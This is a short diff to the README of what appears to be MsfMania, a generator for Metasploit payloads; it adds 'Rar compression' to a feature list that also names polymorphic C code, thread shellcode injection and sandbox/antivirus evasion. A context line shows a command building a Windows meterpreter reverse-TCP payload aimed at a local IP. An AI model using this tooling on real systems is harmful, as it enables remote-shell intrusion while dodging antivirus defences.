@@ -45,6 +45,7 @@ python3 MsfMania.py stageless x64 windows/x64/meterpreter_reverse_tcp 192.168.25
 - Cross-compiler MinGW.
 - Polymorphic C source code.
 - Strip with MinGW.
+- Rar compression.
 - Executable customizable with an icon.
 - Local/Remote Thread Shellcode Injection
 - Sandbox/Antivirus Evasion
